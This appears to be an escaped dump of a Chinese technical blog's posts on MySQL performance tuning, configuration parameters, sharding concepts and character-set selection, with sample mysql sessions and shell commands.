-pJaking@vip.163.commysql&gt; create database jaking; use jaking; create table test2 (id int,name varchar(24)); insert into test2 values (1,&apos;aaaaa&apos;),(2,&apos;aaaaa&apos;),(3,&apos;aaaaa&apos;); create index idx_name on test2(name);mysql&gt; show status like &apos;%key_read%&apos;;+-------------------+-------+| Variable_name&#xA0;&#xA0;&#xA0;&#xA0; | Value |+-------------------+-------+| Key_read_requests | 6&#xA0;&#xA0;&#xA0;&#xA0; || Key_reads&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 3&#xA0;&#xA0;&#xA0;&#xA0; |+-------------------+-------+2 rows in set (0.00 sec)mysql&gt; select name from test2;+-------+| name&#xA0; |+-------+| aaaaa || aaaaa || aaaaa |+-------+3 rows in set (0.00 sec)mysql&gt; show status like &apos;%key_read%&apos;;+-------------------+-------+| Variable_name&#xA0;&#xA0;&#xA0;&#xA0; | Value |+-------------------+-------+| Key_read_requests | 6&#xA0;&#xA0;&#xA0;&#xA0; || Key_reads&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | 3&#xA0;&#xA0;&#xA0;&#xA0; |+-------------------+-------+2 rows in set (0.00 sec) &#x603B;&#x7ED3;&#xFF1A;1&#x3001;&#x770B;&#x673A;&#x5668;&#x914D;&#x7F6E;&#xFF0C;&#x6307;&#x4E09;&#x5927;&#x4EF6;&#xFF1A;cpu&#x3001;&#x5185;&#x5B58;&#x3001;&#x786C;&#x76D8;2&#x3001;&#x770B;mysql&#x914D;&#x7F6E;&#x53C2;&#x6570;3&#x3001;&#x67E5;&#x770B;mysql&#x884C;&#x72B6;&#x6001;4&#x3001;&#x67E5;&#x770B;mysql&#x7684;&#x6162;&#x67E5;&#x8BE2;&#x4F9D;&#x6B21;&#x89E3;&#x51B3;&#x4E86;&#x4EE5;&#x4E0A;&#x95EE;&#x9898;&#x4E4B;&#x540E;&#xFF0C;&#x518D;&#x6765;&#x67E5;&#x627E;&#x7A0B;&#x5E8F;&#x65B9;&#x9762;&#x7684;&#x95EE;&#x9898; #&#x4E0D;&#x8FDB;&#x884C;&#x57DF;&#x540D;&#x53CD;&#x89E3;&#x6790;,&#x6CE8;&#x610F;&#x7531;&#x6B64;&#x5E26;&#x6765;&#x7684;&#x6743;&#x9650;/&#x6388;&#x6743;&#x95EE;&#x9898;&#xFF1B;&#x5173;&#x95ED; MySQL &#x7684; DNS &#x53CD;&#x67E5;&#x529F;&#x80FD;&#xFF1B;&#x8FD9;&#x6837;&#x901F;&#x5EA6;&#x5C31;&#x5FEB;&#x4E86;!12[root@jaking ~]# echo skip-name-resolve &gt;&gt; /etc/my.cnf[root@jaking ~]# systemctl restart mysqld &#x8BE5;&#x9009;&#x9879;&#x5C31;&#x80FD;&#x7981;&#x7528;DNS &#x89E3;&#x6790;&#xFF0C;&#x8FDE;&#x63A5;&#x901F;&#x5EA6;&#x4F1A;&#x5FEB;&#x5F88;&#x591A;&#xFF1B;&#x4E0D;&#x8FC7;&#xFF0C;&#x8FD9;&#x6837;&#x7684;&#x8BDD;&#x5C31;&#x4E0D;&#x80FD;&#x5728;MySQL &#x7684;&#x6388;&#x6743;&#x8868;&#x4E2D;&#x4F7F;&#x7528;&#x4E3B;&#x673A;&#x540D;&#x4E86;&#x800C;&#x53EA;&#x80FD;&#x7528;IP&#x683C;&#x5F0F; #&#x7D22;&#x5F15;&#x7F13;&#x5B58;,&#x6839;&#x636E;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#x800C;&#x5B9A;,&#x5982;&#x679C;&#x662F;&#x72EC;&#x7ACB;&#x7684; DB &#x670D;&#x52A1;&#x5668;,&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x9AD8;&#x8FBE;80%&#x7684;&#x5185;&#x5B58;&#x603B;&#x91CF; key_buffer_size=512M #&#x6253;&#x5F00;&#x8868;&#x7F13;&#x5B58;&#x603B;&#x4E2A;&#x6570;,&#x53EF;&#x4EE5;&#x907F;&#x514D;&#x9891;&#x7E41;&#x7684;&#x6253;&#x5F00;&#x6570;&#x636E;&#x8868;&#x4EA7;&#x751F;&#x7684;&#x5F00;&#x9500; table_open_cache=24 query_cache_size=128M max_connections=10000 #&#x6700;&#x5927;&#x8FDE;&#x63A5;&#x6570; #&#x8BBE;&#x7F6E;&#x8D85;&#x65F6;&#x65F6;&#x95F4;,&#x80FD;&#x907F;&#x514D;&#x957F;&#x8FDE;&#x63A5; wait_timeout=60 #&#x8BB0;&#x5F55;&#x6162;&#x67E5;&#x8BE2;,&#x7136;&#x540E;&#x5BF9;&#x6162;&#x67E5;&#x8BE2;&#x4E00;&#x4E00;&#x4F18;&#x5316;&#x5355;&#x4F4D;&#xFF1A;&#x79D2; slow-queries- log-file=/var/lib/mysql/slow.log long_query_time=5 &#x6269;&#x5C55; MySQL&#x4F18;&#x5316;&#x4E4B;&#x2014;&#x2014;-&#x5206;&#x5E93;&#x5206;&#x8868;1 &#x57FA;&#x672C;&#x601D;&#x60F3;&#x4E4B;&#x4EC0;&#x4E48;&#x662F;&#x5206;&#x5E93;&#x5206;&#x8868;&#xFF1F;&#x4ECE;&#x5B57;&#x9762;&#x4E0A;&#x7B80;&#x5355;&#x7406;&#x89E3;&#xFF0C;&#x5C31;&#x662F;&#x628A;&#x539F;&#x672C;&#x5B58;&#x50A8;&#x4E8E;&#x4E00;&#x4E2A;&#x5E93;&#x7684;&#x6570;&#x636E;&#x5206;&#x5757;&#x5B58;&#x50A8;&#x5230;&#x591A;&#x4E2A;&#x5E93;&#x4E0A;&#xFF0C;&#x628A;&#x539F;&#x672C;&#x5B58;&#x50A8;&#x4E8E;&#x4E00;&#x4E2A;&#x8868;&#x7684;&#x6570;&#x636E;&#x5206;&#x5757;&#x5B58;&#x50A8;&#x5230;&#x591A;&#x4E2A;&#x8868;&#x4E0A;&#x3002; 2 &#x57FA;&#x672C;&#x601D;&#x60F3;&#x4E4B;&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x5206;&#x5E93;&#x5206;&#x8868;&#xFF1F; &#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x91CF;&#x4E0D;&#x4E00;&#x5B9A;&#x662F;&#x53EF;&#x63A7;&#x7684;&#xFF0C;&#x5728;&#x672A;&#x8FDB;&#x884C;&#x5206;&#x5E93;&#x5206;&#x8868;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x968F;&#x7740;&#x65F6;&#x95F4;&#x548C;&#x4E1A;&#x52A1;&#x7684;&#x53D1;&#x5C55;&#xFF0C;&#x5E93;&#x4E2D;&#x7684;&#x8868;&#x4F1A;&#x8D8A;&#x6765;&#x8D8A;&#x591A;&#xFF0C;&#x8868;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x91CF;&#x4E5F;&#x4F1A;&#x8D8A;&#x6765;&#x8D8A;&#x5927;&#xFF0C;&#x76F8;&#x5E94;&#x5730;&#xFF0C;&#x6570;&#x636E;&#x64CD;&#x4F5C;&#xFF0C;&#x589E;&#x5220;&#x6539;&#x67E5;&#x7684;&#x5F00;&#x9500;&#x4E5F;&#x4F1A;&#x8D8A;&#x6765;&#x8D8A;&#x5927;&#xFF1B;&#x53E6;&#x5916;&#xFF0C;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8D44;&#x6E90;&#xFF08;CPU&#x3001;&#x78C1;&#x76D8;&#x3001;&#x5185;&#x5B58;&#x3001;IO&#x7B49;&#xFF09;&#x662F;&#x6709;&#x9650;&#x7684;&#xFF0C;&#x6700;&#x7EC8;&#x6570;&#x636E;&#x5E93;&#x6240;&#x80FD;&#x627F;&#x8F7D;&#x7684;&#x6570;&#x636E;&#x91CF;&#x3001;&#x6570;&#x636E;&#x5904;&#x7406;&#x80FD;&#x529B;&#x90FD;&#x5C06;&#x906D;&#x9047;&#x74F6;&#x9888; 3 &#x5206;&#x5E93;&#x5206;&#x8868;&#x7684;&#x5B9E;&#x65BD;&#x7B56;&#x7565;&#x3002; &#x5982;&#x679C;&#x4F60;&#x7684;&#x5355;&#x673A;&#x6027;&#x80FD;&#x5F88;&#x4F4E;&#x4E86;&#xFF0C;&#x90A3;&#x53EF;&#x4EE5;&#x5C1D;&#x8BD5;&#x5206;&#x5E93;&#x3002;&#x5206;&#x5E93;&#xFF0C;&#x4E1A;&#x52A1;&#x900F;&#x660E;&#xFF0C;&#x5728;&#x7269;&#x7406;&#x5B9E;&#x73B0;&#x4E0A;&#x5206;&#x6210;&#x591A;&#x4E2A;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x5206;&#x5E93;&#x5728;&#x4E0D;&#x540C;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x3002;&#x5206;&#x533A;&#x53EF;&#x4EE5;&#x628A;&#x8868;&#x5206;&#x5230;&#x4E0D;&#x540C;&#x7684;&#x786C;&#x76D8;&#x4E0A;&#xFF0C;&#x4F46;&#x4E0D;&#x80FD;&#x5206;&#x914D;&#x5230;&#x4E0D;&#x540C;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x3002;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x7684;&#x6027;&#x80FD;&#x662F;&#x6709;&#x9650;&#x5236;&#x7684;&#xFF0C;&#x7528;&#x5206;&#x5E93;&#x53EF;&#x4EE5;&#x89E3;&#x51B3;&#x5355;&#x53F0;&#x670D;&#x52A1;&#x5668;&#x6027;&#x80FD;&#x4E0D;&#x591F;&#xFF0C;&#x6216;&#x8005;&#x6210;&#x672C;&#x8FC7;&#x9AD8;&#x95EE;&#x9898;&#x3002; &#x5F53;&#x5206;&#x533A;&#x4E4B;&#x540E;&#xFF0C;&#x8868;&#x8FD8;&#x662F;&#x5F88;&#x5927;&#xFF0C;&#x5904;&#x7406;&#x4E0D;&#x8FC7;&#x6765;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#x53EF;&#x4EE5;&#x7528;&#x5206;&#x5E93;&#x3002;orderid,userid,ordertime,&#x2026;..userid%4=0&#xFF0C;&#x7528;&#x5206;&#x5E93;1userid%4=1&#xFF0C;&#x7528;&#x5206;&#x5E93;2userid%4=2, &#x7528;&#x5206;&#x5E93;3userid%4=3&#xFF0C;&#x7528;&#x5206;&#x5E93;4 &#x4E0A;&#x9762;&#x8FD9;&#x4E2A;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x5206;&#x5E93;&#x8DEF;&#x7531;&#xFF0C;&#x6839;&#x636E;userid&#x9009;&#x62E9;&#x5206;&#x5E93;&#xFF0C;&#x5373;&#x4E0D;&#x540C;&#x7684;&#x670D;&#x52A1;&#x5668; 4 &#x5206;&#x5E93;&#x5206;&#x8868;&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;&#x3002; 4.1 &#x4E8B;&#x52A1;&#x95EE;&#x9898;&#x3002; &#x5728;&#x6267;&#x884C;&#x5206;&#x5E93;&#x5206;&#x8868;&#x4E4B;&#x540E;&#xFF0C;&#x7531;&#x4E8E;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x5230;&#x4E86;&#x4E0D;&#x540C;&#x7684;&#x5E93;&#x4E0A;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x4E8B;&#x52A1;&#x7BA1;&#x7406;&#x51FA;&#x73B0;&#x4E86;&#x56F0;&#x96BE;&#x3002;&#x5982;&#x679C;&#x4F9D;&#x8D56;&#x6570;&#x636E;&#x5E93;&#x672C;&#x8EAB;&#x7684;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x7BA1;&#x7406;&#x529F;&#x80FD;&#x53BB;&#x6267;&#x884C;&#x4E8B;&#x52A1;&#xFF0C;&#x5C06;&#x4ED8;&#x51FA;&#x9AD8;&#x6602;&#x7684;&#x6027;&#x80FD;&#x4EE3;&#x4EF7;&#xFF1B;&#x5982;&#x679C;&#x7531;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x53BB;&#x534F;&#x52A9;&#x63A7;&#x5236;&#xFF0C;&#x5F62;&#x6210;&#x7A0B;&#x5E8F;&#x903B;&#x8F91;&#x4E0A;&#x7684;&#x4E8B;&#x52A1;&#xFF0C;&#x53C8;&#x4F1A;&#x9020;&#x6210;&#x7F16;&#x7A0B;&#x65B9;&#x9762;&#x7684;&#x8D1F;&#x62C5;&#x3002; 4.2 &#x8DE8;&#x5E93;&#x8DE8;&#x8868;&#x7684;join&#x95EE;&#x9898;&#x3002; &#x5728;&#x6267;&#x884C;&#x4E86;&#x5206;&#x5E93;&#x5206;&#x8868;&#x4E4B;&#x540E;&#xFF0C;&#x96BE;&#x4EE5;&#x907F;&#x514D;&#x4F1A;&#x5C06;&#x539F;&#x672C;&#x903B;&#x8F91;&#x5173;&#x8054;&#x6027;&#x5F88;&#x5F3A;&#x7684;&#x6570;&#x636E;&#x5212;&#x5206;&#x5230;&#x4E0D;&#x540C;&#x7684;&#x8868;&#x3001;&#x4E0D;&#x540C;&#x7684;&#x5E93;&#x4E0A;&#xFF0C;&#x8FD9;&#x65F6;&#xFF0C;&#x8868;&#x7684;&#x5173;&#x8054;&#x64CD;&#x4F5C;&#x5C06;&#x53D7;&#x5230;&#x9650;&#x5236;&#xFF0C;&#x6211;&#x4EEC;&#x65E0;&#x6CD5;join&#x4F4D;&#x4E8E;&#x4E0D;&#x540C;&#x5206;&#x5E93;&#x7684;&#x8868;&#xFF0C;&#x4E5F;&#x65E0;&#x6CD5;join&#x5206;&#x8868;&#x7C92;&#x5EA6;&#x4E0D;&#x540C;&#x7684;&#x8868;&#xFF0C;&#x7ED3;&#x679C;&#x539F;&#x672C;&#x4E00;&#x6B21;&#x67E5;&#x8BE2;&#x80FD;&#x591F;&#x5B8C;&#x6210;&#x7684;&#x4E1A;&#x52A1;&#xFF0C;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x591A;&#x6B21;&#x67E5;&#x8BE2;&#x624D;&#x80FD;&#x5B8C;&#x6210;&#x3002; 4.3 &#x989D;&#x5916;&#x7684;&#x6570;&#x636E;&#x7BA1;&#x7406;&#x8D1F;&#x62C5;&#x548C;&#x6570;&#x636E;&#x8FD0;&#x7B97;&#x538B;&#x529B;&#x3002; &#x989D;&#x5916;&#x7684;&#x6570;&#x636E;&#x7BA1;&#x7406;&#x8D1F;&#x62C5;&#xFF0C;&#x6700;&#x663E;&#x800C;&#x6613;&#x89C1;&#x7684;&#x5C31;&#x662F;&#x6570;&#x636E;&#x7684;&#x5B9A;&#x4F4D;&#x95EE;&#x9898;&#x548C;&#x6570;&#x636E;&#x7684;&#x589E;&#x5220;&#x6539;&#x67E5;&#x7684;&#x91CD;&#x590D;&#x6267;&#x884C;&#x95EE;&#x9898;&#xFF0C;&#x8FD9;&#x4E9B;&#x90FD;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x89E3;&#x51B3;&#xFF0C;&#x4F46;&#x5FC5;&#x7136;&#x5F15;&#x8D77;&#x989D;&#x5916;&#x7684;&#x903B;&#x8F91;&#x8FD0;&#x7B97;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x8BB0;&#x5F55;&#x7528;&#x6237;&#x6210;&#x7EE9;&#x7684;&#x7528;&#x6237;&#x6570;&#x636E;&#x8868;userTable&#xFF0C;&#x4E1A;&#x52A1;&#x8981;&#x6C42;&#x67E5;&#x51FA;&#x6210;&#x7EE9;&#x6700;&#x597D;&#x7684;100&#x4F4D;&#xFF0C;&#x5728;&#x8FDB;&#x884C;&#x5206;&#x8868;&#x4E4B;&#x524D;&#xFF0C;&#x53EA;&#x9700;&#x4E00;&#x4E2A;order by&#x8BED;&#x53E5;&#x5C31;&#x53EF;&#x4EE5;&#x641E;&#x5B9A;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x8FDB;&#x884C;&#x5206;&#x8868;&#x4E4B;&#x540E;&#xFF0C;&#x5C06;&#x9700;&#x8981;n&#x4E2A;order by&#x8BED;&#x53E5;&#xFF0C;&#x5206;&#x522B;&#x67E5;&#x51FA;&#x6BCF;&#x4E00;&#x4E2A;&#x5206;&#x8868;&#x7684;&#x524D;100&#x540D;&#x7528;&#x6237;&#x6570;&#x636E;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x5BF9;&#x8FD9;&#x4E9B;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x5408;&#x5E76;&#x8BA1;&#x7B97;&#xFF0C;&#x624D;&#x80FD;&#x5F97;&#x51FA;&#x7ED3;&#x679C;&#x3002; MySQL5.7 &#x5B98;&#x65B9;&#x6587;&#x6863;https://dev.mysql.com/doc/refman/5.7/en/ document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"MySQL备份与恢复（删库不跑路）","date":"2022-06-07T04:44:29.000Z","path":"/posts/269a56e8/","text":"&#x4E00;&#xFF1A;MySQL&#x5B57;&#x7B26;&#x96C6;1&#xFF1A;&#x5B57;&#x7B26;&#x96C6;&#x4ECB;&#x7ECD;&#x5B57;&#x7B26;&#x96C6;&#x5C31;&#x662F;&#x4E00;&#x5957;&#x6587;&#x5B57;&#x7B26;&#x53F7;&#x53CA;&#x5176;&#x7F16;&#x7801;&#x3001;&#x6BD4;&#x8F83;&#x89C4;&#x5219;&#x7684;&#x96C6;&#x5408;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x8BA1;&#x7B97;&#x673A;&#x5B57;&#x7B26;&#x96C6;ASC2&#xFF1B;MySQL&#x6570;&#x636E;&#x5E93;&#x5B57;&#x7B26;&#x96C6;&#x5305;&#x62EC;&#x5B57;&#x7B26;&#x96C6;&#xFF08;CHARACTER&#xFF09;&#x548C;&#x6821;&#x5BF9;&#x89C4;&#x5219;&#xFF08;COLLATION&#xFF09;&#x4E24;&#x4E2A;&#x6982;&#x5FF5;&#xFF0C;&#x5176;&#x4E2D;&#x5B57;&#x7B26;&#x96C6;&#x7528;&#x6765;&#x5B9A;&#x4E49;MySQL&#x6570;&#x636E;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x5B58;&#x50A8;&#x65B9;&#x5F0F;&#xFF0C;&#x800C;&#x6821;&#x5BF9;&#x89C4;&#x5219;&#x5B9A;&#x4E49;&#x6BD4;&#x8F83;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x65B9;&#x5F0F; 2&#xFF1A;MySQL&#x6570;&#x636E;&#x5E93;&#x5E38;&#x89C1;&#x5B57;&#x7B26;&#x96C6;&#x4ECB;&#x7ECD; &#x9009;&#x62E9;&#x5B57;&#x7B26;&#x96C6;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528;&#x56FD;&#x9645;&#x6807;&#x51C6;&#x7684;utf8 3&#xFF1A;MySQL&#x600E;&#x6837;&#x9009;&#x62E9;&#x5408;&#x9002;&#x7684;&#x5B57;&#x7B26;&#x96C6;1&#x3001;&#x5982;&#x679C;&#x5904;&#x7406;&#x5404;&#x79CD;&#x5404;&#x6837;&#x7684;&#x6587;&#x5B57;&#xFF0C;&#x53D1;&#x5E03;&#x5230;&#x4E0D;&#x540C;&#x8BED;&#x8A00;&#x56FD;&#x5BB6;&#x5730;&#x533A;&#xFF0C;&#x5E94;&#x9009;Unicode&#x5B57;&#x7B26;&#x96C6;&#xFF0C;&#x5BF9;MySQL&#x6765;&#x8BF4;&#x5C31;&#x662F;utf8(&#x6BCF;&#x4E2A;&#x6C49;&#x5B57;&#x4E09;&#x4E2A;&#x5B57;&#x8282;)2&#x3001;&#x5982;&#x679C;&#x53EA;&#x662F;&#x9700;&#x8981;&#x652F;&#x6301;&#x4E2D;&#x6587;&#xFF0C;&#x5E76;&#x4E14;&#x6570;&#x636E;&#x91CF;&#x5F88;&#x5927;&#xFF0C;&#x6027;&#x80FD;&#x8981;&#x6C42;&#x4E5F;&#x9AD8;&#xFF0C;&#x53EF;&#x9009;GBK(&#x5B9A;&#x957F;&#xFF0C;&#x6BCF;&#x4E2A;&#x6C49;&#x5B57;&#x5360;&#x53CC;&#x5B57;&#x8282;&#xFF0C;&#x82F1;&#x6587;&#x4E5F;&#x5360;&#x53CC;&#x5B57;&#x8282;)&#xFF0C;&#x5982;&#x679C;&#x662F;&#x5927;&#x91CF;&#x8FD0;&#x7B97;&#xFF0C;&#x6BD4;&#x8F83;&#x6392;&#x5E8F;&#x7B49;&#xFF0C;&#x5B9A;&#x957F;&#x5B57;&#x7B26;&#x96C6;&#x66F4;&#x5FEB;&#xFF0C;&#x6027;&#x80FD;&#x4E5F;&#x9AD8;3&#x3001;&#x5904;&#x7406;&#x79FB;&#x52A8;&#x4E92;&#x8054;&#x7F51;&#x4E1A;&#x52A1;&#xFF0C;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x4F7F;&#x7528;utf8mb4&#x5B57;&#x7B26;&#x96C6; 4&#xFF1A;&#x67E5;&#x770B;&#x5F53;&#x524D;MySQL&#x652F;&#x6301;&#x7684;&#x5B57;&#x7B26;&#x96C6; MySQL&#x53EF;&#x4EE5;&#x652F;&#x6301;&#x591A;&#x79CD;&#x5B57;&#x7B26;&#x96C6;&#xFF0C;&#x540C;&#x4E00;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x5E93;&#x6216;&#x8868;&#x7684;&#x4E0D;&#x540C;&#x5B57;&#x6BB5;&#x90FD;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;&#x4E0D;&#x540C;&#x7684;&#x5B57;&#x7B26;&#x96C6; mysql -uroot -pJaking@vip.163.com -e &quot;show character set \\G;&quot; #&#x67E5;&#x770B;&#x6240;&#x6709;&#x7684;&#x5B57;&#x7B26;&#x96C6; &#x67E5;&#x770B;&#x5E38;&#x7528;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#xFF1A; mysql -uroot -pJaking@vip.163.com -e &quot;show character set\\G;&quot; |egrep &quot;gbk|utf8|latin1&quot;|awk &apos;{print $0}&apos; 12345678910[root@jaking ~]# mysql -uroot -pJaking@vip.163.com -e &quot;show character set\\G;&quot; | egrep &quot;gbk|utf8|latin1&quot;|awk &apos;{print $0}&apos;mysql: [Warning] Using a password on the command line interface can be insecure.&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; Charset: latin1Default collation: latin1_swedish_ci&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; Charset: gbkDefault collation: gbk_chinese_ci&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; Charset: utf8Default collation: utf8_general_ci&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; Charset: utf8mb4Default collation: utf8mb4_general_ci 5&#xFF1A;&#x67E5;&#x770B;MySQL&#x5F53;&#x524D;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#x8BBE;&#x7F6E;&#x60C5;&#x51B5;123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101mysql&gt; show variables like &apos;character_set%&apos;;+--------------------------+------------------------------------+| Variable_name&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | Value&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |+--------------------------+------------------------------------+| character_set_client&#xA0;&#xA0;&#xA0;&#xA0; | utf8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;|| character_set_connection | utf8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || character_set_database&#xA0;&#xA0; | utf8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || character_set_filesystem | binary&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || character_set_results&#xA0;&#xA0;&#xA0; | utf8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;|| character_set_server&#xA0;&#xA0;&#xA0;&#xA0; | utf8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || character_set_system&#xA0;&#xA0;&#xA0;&#xA0; | utf8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; || character_sets_dir&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | /usr/local/mysql57/share/charsets/ |+--------------------------+------------------------------------+8 rows in set (0.00 sec)mysql&gt; show character set;+----------+---------------------------------+---------------------+--------+| Charset&#xA0; | Description&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | Default collation&#xA0;&#xA0; | Maxlen |+----------+---------------------------------+---------------------+--------+| big5&#xA0;&#xA0;&#xA0;&#xA0; | Big5 Traditional Chinese&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | big5_chinese_ci&#xA0;&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 2 || dec8&#xA0;&#xA0;&#xA0;&#xA0; | DEC West European&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | dec8_swedish_ci&#xA0;&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || cp850&#xA0;&#xA0;&#xA0; | DOS West European&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | cp850_general_ci&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || hp8&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | HP West European&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | hp8_english_ci&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || koi8r&#xA0;&#xA0;&#xA0; | KOI8-R Relcom Russian&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | koi8r_general_ci&#xA0;&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || latin1&#xA0;&#xA0; | cp1252 West European&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; | latin1_swedish_ci&#xA0;&#xA0; |&#xA0;&#xA0;&#xA0;&#xA0;&#xA0; 1 || latin2&#xA0;&#xA0; | ISO 8859-2 Central European&#xA0;&#xA0;&#xA0;&#xA0; | latin2_general_ci&#xA0;&#xA0; 